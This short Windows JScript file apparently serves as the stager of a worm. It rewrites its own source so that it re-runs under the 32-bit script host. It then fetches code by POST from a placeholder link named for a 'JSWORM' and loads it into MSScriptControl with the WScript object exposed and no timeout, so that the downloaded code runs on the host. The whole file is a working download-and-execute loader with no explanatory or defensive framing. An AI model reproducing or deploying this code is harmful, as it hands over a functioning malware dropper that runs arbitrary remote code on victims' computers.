// Working with 32/64bit

function cr(com) {
	return new ActiveXObject(com);
}

var fs = cr("Scripting.FileSystemObject");
var sh = cr("WScript.Shell");
var wdir = sh.ExpandEnvironmentStrings("%windir%");
var rr = "N";

function rw(p,o,n) {
	var rd = fs.OpenTextFile(p,1);
	var gt = rd.ReadAll();
	rd.close();
	gt = gt.replace(o,n);
	var wr = fs.OpenTextFile(p,2,false);
	wr.Write(gt);
	wr.Close();
}

if (fs.FileExists(wdir + "\\SysWOW64\\wscript.exe")) {
	if (rr != "Y") {
		rw(WScript.ScriptFullName,"rr = \"N\"","rr = \"Y\"");
		sh.run(wdir + "\\SysWOW64\\wscript.exe " + "\"" + WScript.ScriptFullName + "\"", 6);
		WScript.quit();
	}
}

rw(WScript.ScriptFullName,"rr = \"Y\"","rr = \"N\"");

var A= cr("MSXML2.XMLHTTP");
A.Open("POST","[RAW_LINK_JSWORM]",false);
A.send("");
var code=A.responsetext;

var sc = cr("MSScriptControl.ScriptControl");
sc.Language = "JScript";
sc.AddObject("WScript",WScript);
sc.TimeOut = -1;
sc.AddCode(code);
